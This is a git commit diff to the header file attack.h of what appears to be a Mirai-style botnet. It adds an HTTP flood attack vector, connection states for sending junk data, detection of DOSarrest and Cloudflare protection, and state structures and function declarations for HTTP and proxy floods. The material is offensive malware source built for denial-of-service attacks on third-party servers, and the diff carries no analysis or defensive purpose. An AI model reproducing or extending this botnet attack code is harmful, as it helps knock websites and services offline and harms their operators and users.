2f475dd320c09c66f9b4ab51bb8aa5a5e4f1b50c
zxcr9999 <91445089+hoaan1995@users.noreply.github.com>
2022-06-21 05:29:16 -0700

    Update attack.h

--- bot/attack.h
+++ bot/attack.h
@@ -6,7 +6,7 @@
 #include <linux/tcp.h>
 #include "includes.h"
 #include "protocol.h"
-#define ATTACK_CONCURRENT_MAX   1000
+#define ATTACK_CONCURRENT_MAX   5
 #define HTTP_CONNECTION_MAX     500
 struct attack_target {
     struct sockaddr_in sock_addr;
@@ -28,6 +28,7 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_STOMP      6
 #define ATK_VEC_SYN        7
 #define ATK_VEC_TCPFRAG    8
+#define ATK_VEC_HTTP       9
 
 #define ATK_OPT_PAYLOAD_SIZE    0
 #define ATK_OPT_PAYLOAD_RAND    1
@@ -70,6 +71,68 @@ struct attack_stomp_data {
     port_t sport, dport;
 };
 
+#define HTTP_CONN_INIT          0 // Inital state
+#define HTTP_CONN_RESTART       1 // Scheduled to restart connection next spin
+#define HTTP_CONN_CONNECTING    2 // Waiting for it to connect
+#define HTTP_CONN_HTTPS_STUFF   3 // Handle any needed HTTPS stuff such as negotiation
+#define HTTP_CONN_SEND          4 // Sending HTTP request
+#define HTTP_CONN_SEND_HEADERS  5 // Send HTTP headers 
+#define HTTP_CONN_RECV_HEADER   6 // Get HTTP headers and check for things like location or cookies etc
+#define HTTP_CONN_RECV_BODY     7 // Get HTTP body and check for cf iaua mode
+#define HTTP_CONN_SEND_JUNK		8 // Send as much data as possible
+#define HTTP_CONN_SNDBUF_WAIT   9 // Wait for socket to be available to be written to
+#define HTTP_CONN_QUEUE_RESTART 10 // restart the connection/send new request BUT FIRST read any other available data.
+#define HTTP_CONN_CLOSED        11 // Close connection and move on
+
+#define HTTP_RDBUF_SIZE         1024
+#define HTTP_HACK_DRAIN         64
+#define HTTP_PATH_MAX           256
+#define HTTP_DOMAIN_MAX         128
+#define HTTP_COOKIE_MAX         5   // no more then 5 tracked cookies
+#define HTTP_COOKIE_LEN_MAX     128 // max cookie len
+#define HTTP_POST_MAX           512 // max post data len
+
+#define HTTP_PROT_DOSARREST     1 // Server: DOSarrest
+#define HTTP_PROT_CLOUDFLARE    2 // Server: cloudflare-nginx
+
+struct attack_http_state {
+    int fd;
+    uint8_t state;
+    int last_recv;
+    int last_send;
+    ipv4_t dst_addr;
+    char user_agent[512];
+    char path[HTTP_PATH_MAX + 1];
+    char domain[HTTP_DOMAIN_MAX + 1];
+    char postdata[HTTP_POST_MAX + 1];
+    char method[9];
+    char orig_method[9];
+
+    int protection_type;
+
+    int keepalive;
+    int chunked;
+    int content_length;
+
+    int num_cookies;
+    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];
+
+    int rdbuf_pos;
+    char rdbuf[HTTP_RDBUF_SIZE];
+};
+
+struct attack_cfnull_state {
+    int fd;
+    uint8_t state;
+    int last_recv;
+    int last_send;
+    ipv4_t dst_addr;
+    char user_agent[512];
+    char domain[HTTP_DOMAIN_MAX + 1];
+    int to_send;
+};
+
+
 
 BOOL attack_init(void);
 void attack_kill_all(void);
@@ -89,5 +152,7 @@ void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_opti
 void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_method_tcpstomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
 static void free_opts(struct attack_option *, int);
